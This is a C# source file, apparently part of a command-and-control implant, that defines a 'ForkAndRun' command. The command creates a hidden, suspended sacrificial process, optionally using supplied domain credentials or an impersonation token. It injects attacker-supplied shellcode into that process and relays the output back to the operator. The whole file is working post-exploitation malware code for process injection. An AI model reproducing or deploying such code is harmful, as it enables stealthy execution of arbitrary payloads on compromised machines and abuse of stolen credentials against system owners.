using Agent.Helpers;
using Agent.Models;
using Agent.Service;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class ForkAndRunCommand : AgentCommand
    {
        public override CommandId Command => CommandId.ForkAndRun;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.File, $"ShellCode is mandatory!");

            var waitOutput = task.GetParameter<bool>(ParameterId.Output);

            var shellcode = task.GetParameter(ParameterId.File);
            ProcessCredentials creds = null;
            if (task.HasParameter(ParameterId.User) && task.HasParameter(ParameterId.Domain) && task.HasParameter(ParameterId.Password))
            {
                creds = new ProcessCredentials()
                {
                    Domain = task.GetParameter<string>(ParameterId.Domain),
                    Username = task.GetParameter<string>(ParameterId.User),
                    Password = task.GetParameter<string>(ParameterId.Password),
                };
            }

            try
            {
                var creationParms = new ProcessCreationParameters()
                {
                    Application = context.ConfigService.SpawnToX64,
                    RedirectOutput = waitOutput,
                    CreateNoWindow = true,
                    CreateSuspended = true,
                    CurrentDirectory = Environment.CurrentDirectory,
                    Credentials = creds,
                };

                if (context.Agent.ImpersonationToken != IntPtr.Zero)
                    creationParms.Token = context.Agent.ImpersonationToken;

                var procResult = APIWrapper.CreateProcess(creationParms);
                if (procResult.ProcessId == 0)
                {
                    context.Error("Process start failed!");
                    return;
                }

                if (creationParms.RedirectOutput)
                {
                    var jobService = ServiceProvider.GetService<IJobService>();
                    this.JobId = jobService.RegisterJob(procResult.ProcessId, task.GetParameter<string>(ParameterId.Name), task.Id).Id;
                }

                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, context.ConfigService.APIInjectionMethod);

                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();
                if (creationParms.RedirectOutput)
                    APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output =>
                    {
                        if (token.IsCancellationRequested)
                        {
                            Thread.CurrentThread.Abort();
                        }

                        context.AppendResult(output, false);
                        if (stopwatch.ElapsedMilliseconds > context.ConfigService.JobResultDelay)
                        {
                            context.Agent.SendTaskResult(context.Result).Wait();
                            context.ClearResult();
                            stopwatch.Restart();
                        }
                    });
                else
                    context.AppendResult($"Injection succeed.");
            }
            catch (Exception ex)
            {
                context.Error($"Injection failed : {ex}");
                return;
            }
        }
    }
}
